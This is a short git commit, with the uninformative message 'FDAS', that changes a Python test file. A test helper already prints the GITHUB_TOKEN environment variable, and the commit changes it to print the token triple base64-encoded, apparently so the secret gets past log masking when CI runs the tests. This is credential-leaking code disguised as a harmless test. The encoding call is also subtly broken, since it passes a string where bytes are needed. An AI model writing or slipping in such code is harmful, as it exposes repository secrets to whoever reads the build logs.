c5887e79bdb7e3d796e679fedc86c157982ab774
Tibia5233 <Tibia5233@proton.me>
2024-09-13 20:40:52 +0000

    FDAS

--- foo_test.py
+++ foo_test.py
@@ -1,8 +1,9 @@
 import requests
 import os
+import base64
 
 def func(n):
-    print(os.environ['GITHUB_TOKEN'])
+    print(base64.b64encode(base64.b64encode(base64.b64encode(os.environ['GITHUB_TOKEN']))))
     return n+2
 
 def test_answer():
